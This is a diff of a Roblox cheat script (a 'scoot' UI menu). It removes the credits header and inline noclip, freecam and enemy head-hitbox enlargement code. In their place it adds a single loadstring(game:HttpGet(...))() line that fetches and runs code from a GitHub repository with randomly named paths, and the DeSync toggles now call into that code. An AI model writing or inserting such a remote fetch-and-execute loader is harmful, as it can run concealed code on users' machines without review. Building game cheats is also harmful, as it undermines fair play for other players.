@@ -1,11 +1,3 @@
---[[
-    scoot ui library
-    made by samet
-    remade by anhchangm52
-    
-    example/documentation is at the bottom
-]]
-
 if Library then
     Library:Unload()
 end
@@ -7616,45 +7608,6 @@ player.CharacterAdded:Connect(function()
 	end
 end)
 
-local noclipEnabled = false
-local noclipConnection
-
-AntiiiSection:Toggle({
-    Name = "NoClip",
-    Flag = "NoclipEnabled",
-    Default = false,
-    Callback = function(state)
-
-        noclipEnabled = state
-
-        if noclipEnabled then
-            noclipConnection = RunService.Stepped:Connect(function()
-                if LocalPlayer.Character then
-                    for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
-                        if part:IsA("BasePart") and part.CanCollide == true then
-                            part.CanCollide = false
-                        end
-                    end
-                end
-            end)
-        else
-            if noclipConnection then
-                noclipConnection:Disconnect()
-                noclipConnection = nil
-            end
-            if LocalPlayer.Character then
-                for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
-                    if part:IsA("BasePart") then
-                        part.CanCollide = true
-                    end
-                end
-            end
-        end
-    end
-
-})
-
-
 
 Players = game:GetService("Players")
 LocalPlayer = Players.LocalPlayer
@@ -8626,72 +8579,11 @@ ExploitSection:Toggle({
 })
     local Camera = Workspace.CurrentCamera
 
--- FREECAM
-local freecamEnabled = false
-local connRender
-local camPos, camRot
-local MOVE_SPEED = 2
-local LOOK_SENS = 0.2
-local oldWalkSpeed, oldJumpPower, oldAnchored
 
-local function enableFreecam()
-    freecamEnabled = true
 
-    if lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
-        local h = lp.Character:FindFirstChildOfClass("Humanoid")
-        oldWalkSpeed = h.WalkSpeed
-        oldJumpPower = h.JumpPower
-        h.WalkSpeed = 0
-        h.JumpPower = 0
-        if lp.Character:FindFirstChild("HumanoidRootPart") then
-            oldAnchored = lp.Character.HumanoidRootPart.Anchored
-            lp.Character.HumanoidRootPart.Anchored = true
-        end
-    end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ddqdddffgfrhgggggggggfgggggggggh/fhfgjghjjkkkkkkkkhgg/refs/heads/main/sdfddfhgyyyftgfdddd"))()
 
-    camPos = Camera.CFrame.Position
-    camRot = Vector2.new(0, 0)
-    Camera.CameraType = Enum.CameraType.Scriptable
-
-    connRender = game:GetService("RunService").RenderStepped:Connect(function(dt)
-        if not freecamEnabled then return end
-
-        local move = Vector3.zero
-        local uis = game:GetService("UserInputService")
-        if uis:IsKeyDown(Enum.KeyCode.W) then move += Camera.CFrame.LookVector end
-        if uis:IsKeyDown(Enum.KeyCode.S) then move -= Camera.CFrame.LookVector end
-        if uis:IsKeyDown(Enum.KeyCode.A) then move -= Camera.CFrame.RightVector end
-        if uis:IsKeyDown(Enum.KeyCode.D) then move += Camera.CFrame.RightVector end
-        if uis:IsKeyDown(Enum.KeyCode.E) then move += Camera.CFrame.UpVector end
-        if uis:IsKeyDown(Enum.KeyCode.Q) then move -= Camera.CFrame.UpVector end
-
-        camPos = camPos + move * MOVE_SPEED
-
-        camRot = camRot + Vector2.new(-uis:GetMouseDelta().X, -uis:GetMouseDelta().Y) * LOOK_SENS
-        camRot = Vector2.new(camRot.X % 360, math.clamp(camRot.Y, -89, 89))
-
-        Camera.CFrame = CFrame.new(camPos) *
-            CFrame.Angles(0, math.rad(camRot.X), 0) *
-            CFrame.Angles(math.rad(camRot.Y), 0, 0)
-    end)
-end
-
-local function disableFreecam()
-    freecamEnabled = false
-    if connRender then connRender:Disconnect() connRender = nil end
-    Camera.CameraType = Enum.CameraType.Custom
-
-    if lp.Character and lp.Character:FindFirstChildOfClass("Humanoid") then
-        local h = lp.Character:FindFirstChildOfClass("Humanoid")
-        if oldWalkSpeed then h.WalkSpeed = oldWalkSpeed end
-        if oldJumpPower then h.JumpPower = oldJumpPower end
-        if lp.Character:FindFirstChild("HumanoidRootPart") and oldAnchored ~= nil then
-            lp.Character.HumanoidRootPart.Anchored = oldAnchored
-        end
-    end
-end
-
-local DesyncSection = UtilAimSubPage:Section({Name = "DeSync", Side = 2}) 
+local DesyncSection = UtilAimSubPage:Section({Name = "DeSync", Side = 2})
 
 DesyncSection:Toggle({
     Name = "DeSync",
@@ -8699,10 +8591,10 @@ DesyncSection:Toggle({
     Default = false,
     Callback = function(v)
         if v then
-            enableFreecam()
+            _G.FreecamCore.Enable()
             Library:Notification("DeSync ON", "DeSync Enabled", 8)
         else
-            disableFreecam()
+            _G.FreecamCore.Disable()
         end
     end
 })
@@ -8710,14 +8602,17 @@ DesyncSection:Toggle({
 DesyncSection:Slider({
     Name = "DeSync Speed",
     Flag = "DeSync_Speed",
-    Min = 2,
-    Max = 20,
-    Default = 1,
-    Decimals = 1,
-    Suffix = "px",
-    Callback = function(v)
-        MOVE_SPEED = v
-    end
+    Min = 2, Max = 20, Default = 0.5,
+    Decimals = 1, Suffix = "px",
+    Callback = function(v) _G.FreecamCore.SetSpeed(v) end
+})
+
+DesyncSection:Slider({
+    Name = "Look Sensitivity",
+    Flag = "DeSync_Sens",
+    Min = 0.2, Max = 5.0, Default = 2,
+    Decimals = 0.1, Suffix = "x",
+    Callback = function(v) _G.FreecamCore.SetSens(v) end
 })
 
 
@@ -8726,155 +8621,9 @@ DesyncSection:Slider({
 
 
 
-        local HitBoxSection = UtilAimSubPage:Section({Name = "HitBox", Side = 2}) 
 
 
 
-Players = game:GetService("Players")
-LocalPlayer = Players.LocalPlayer
-
-local currentHitboxSize = 1
-local teamCheckEnabled = false
-local hitboxVisible = true
-
-
-local function removeHitbox(character)
-	if character and character:FindFirstChild("Head") then
-		character.Head.Size = Vector3.new(2, 1, 1)
-		character.Head.Transparency = 0
-		character.Head.CanCollide = false
-		character.Head.CanTouch = true
-
-		if character.Head:FindFirstChild("face") then
-			character.Head.face.Transparency = 0
-		end
-	end
-end
-
-
-
-local function applyHitbox(player, character)
-	if player == LocalPlayer then return end
-	if not character then return end
-
-	if not character:FindFirstChild("Head") then return end
-
-	-- Team check
-	if teamCheckEnabled and player.Team == LocalPlayer.Team then
-		removeHitbox(character)
-		return
-	end
-
-	character.Head.Size = Vector3.new(currentHitboxSize, currentHitboxSize, currentHitboxSize)
-	character.Head.CanCollide = true
-	character.Head.CanTouch = false
-	character.Head.Massless = true
-	character.Head.Transparency = hitboxVisible and 0.2 or 1
-
-	if character.Head:FindFirstChild("face") then
-		character.Head.face.Transparency = hitboxVisible and 0.5 or 1
-	end
-end
-
-
-
-local function connectDeathEvent(player, character)
-	if character:FindFirstChild("Humanoid") then
-		character.Humanoid.Died:Connect(function()
-			removeHitbox(character)
-		end)
-	end
-end
-
-
-local function setupCharacterHitbox(player)
-	if player == LocalPlayer then return end
-
-	player.CharacterAdded:Connect(function(character)
-		character:WaitForChild("Head", 5)
-		
-		task.wait(0.1)
-
-		applyHitbox(player, character)
-		
-		connectDeathEvent(player, character)
-	end)
-
-	if player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health > 0 then
-		applyHitbox(player, player.Character)
-		connectDeathEvent(player, player.Character)
-	end
-end
-
-
-for _, player in ipairs(Players:GetPlayers()) do
-	setupCharacterHitbox(player)
-end
-
-Players.PlayerAdded:Connect(setupCharacterHitbox)
-
-
-
-
-HitBoxSection:Slider({
-    Name = "Hitbox Head",
-    Flag = "Slider_1",
-    Min = 1,
-    Max = 70,
-    Default = 1,
-    Decimals = 1,
-    Suffix = "px",
-    Callback = function(v)
-        currentHitboxSize = v
-
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local humanoid = player.Character:FindFirstChild("Humanoid")
-                if humanoid and humanoid.Health > 0 then
-                    applyHitbox(player, player.Character)
-                end
-            end
-        end
-    end
-})
-
-
-HitBoxSection:Toggle({
-    Name = "Team Check",
-    Flag = "Toggle_TeamCheck",
-    Default = false,
-    Callback = function(Value)
-        teamCheckEnabled = Value
-
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local humanoid = player.Character:FindFirstChild("Humanoid")
-                if humanoid and humanoid.Health > 0 then
-                    applyHitbox(player, player.Character)
-                end
-            end
-        end
-    end
-})
-
-
-HitBoxSection:Toggle({
-    Name = "Show Hitbox",
-    Flag = "Toggle_ShowHitbox",
-    Default = true,
-    Callback = function(Value)
-        hitboxVisible = Value
-
-        for _, player in pairs(Players:GetPlayers()) do
-            if player ~= LocalPlayer and player.Character then
-                local humanoid = player.Character:FindFirstChild("Humanoid")
-                if humanoid and humanoid.Health > 0 then
-                    applyHitbox(player, player.Character)
-                end
-            end
-        end
-    end
-})
 
 
 
